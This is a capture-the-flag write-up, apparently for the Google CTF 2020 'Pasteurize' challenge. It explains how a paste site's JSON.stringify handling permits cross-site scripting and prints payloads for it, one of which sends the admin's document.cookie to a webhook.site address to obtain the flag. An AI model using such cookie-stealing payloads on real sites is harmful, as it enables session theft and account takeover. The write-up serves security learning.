>This doesn't look secure. I wouldn't put even the littlest secret in here. My source tells me that third parties might have implanted it with their little treats already. Can you prove me right?

### 50pts

The site lets you create a paste and submit to later share it with TJMike.

When you look at the source it is a node,express app where it uses JSON.stringify to converts a JavaScript object or value to a JSON string.

It then slices the first and last char of the input where we can further exploit.

It also uses the DOMPurify library to sanitize input renoving the option of trying DOM based XSS.


escape string also replaces the <,> so our paths are limited to exploiting JSON Stringify where we can send objects and understand the results to then chain together our exploit to fetch the admin details to access the flag.

we can then start with a var and supply our payload

asd[] = ;alert(1);


Now to send the request to TJMIKE and get the flag we need to find a way to send our request to TJMIKE we can use webhook.site and sent the unique URL as an Image payload to then share the paste with TJMIKE and access the cookie with the flag.

`"content[]"=";new Image().src='https://webhook.site/8db05257-6ad1-44a9-979a-574c1caca5d6?asdf='+document.cookie//"`


sharing the paste with TJMike we look at the result at the webhook.site where we then have the flag for the query strings.

CTF{Express_t0_Tr0ubl3s}

https://webhook.site/#!/8db05257-6ad1-44a9-979a-574c1caca5d6/51471bd0-6be7-4555-9fd8-858ed4375897/1

https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify


### More Writeups
https://github.com/TeamUnderdawgs/CTF-Docs/blob/master/googleCtf2020/Web/pasterize.md

https://7riple7hrea7.com/google/ctf/Pasteurize-GoogleCTF/
